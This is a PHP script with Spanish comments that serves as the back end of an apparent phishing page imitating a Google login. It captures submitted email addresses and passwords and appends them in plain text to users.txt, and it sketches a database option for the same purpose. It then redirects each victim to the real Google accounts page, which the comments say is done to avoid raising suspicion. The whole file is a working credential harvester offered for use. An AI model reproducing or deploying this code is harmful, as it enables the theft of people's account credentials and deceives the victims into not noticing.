<?php
// Configurar cabeceras si es necesario (opcional)
// session_start();

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Capturar los campos enviados por el formulario
    $email = isset($_POST['email']) ? trim($_POST['email']) : '';
    $password = isset($_POST['password']) ? trim($_POST['password']) : '';

    // Validar que los campos no estén vacíos
    if (!empty($email) && !empty($password)) {
        
        // --- OPCIÓN A: Guardar en un archivo de texto (Ejemplo básico) ---
        $linea = "Correo: " . $email . " | Contraseña: " . $password . " | Fecha: " . date("Y-m-d H:i:s") . "\n";
        $archivo = fopen("users.txt", "a");
        if ($archivo) {
            fwrite($archivo, $linea);
            fclose($archivo);
        }

        /* 
        // --- OPCIÓN B: Guardar en Base de Datos (Más avanzado/realista) ---
        // $conexion = new mysqli("localhost", "usuario", "clave", "base_datos");
        // $stmt = $conexion->prepare("INSERT INTO credenciales (email, password) VALUES (?, ?)");
        // $stmt->bind_param("ss", $email, $password);
        // $stmt->execute();
        // $stmt->close();
        // $conexion->close();
        */
    }

    // Redirigir siempre a la página oficial de Google para evitar levantar sospechas
    header("Location: https://accounts.google.com");
    exit();
} else {
    // Si intentan acceder directamente por la URL sin enviar POST, redirigir al index
    header("Location: index.html");
    exit();
}
?>